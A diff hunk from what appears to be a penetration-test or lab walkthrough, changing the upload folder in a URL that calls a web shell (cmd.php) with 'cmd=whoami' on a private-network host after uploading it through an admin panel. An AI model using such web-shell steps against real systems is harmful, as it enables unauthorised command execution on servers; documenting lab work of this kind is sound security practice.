@@ -50,7 +50,7 @@ Upload cmd.php via admin panel.
 Step 7: Remote Command Execution
 
 Access web shell:
-http://10.150.150.11/upload/2/cmd.php?cmd=whoami
+http://10.150.150.11/upload/16/cmd.php?cmd=whoami
 
 Verified command execution
 
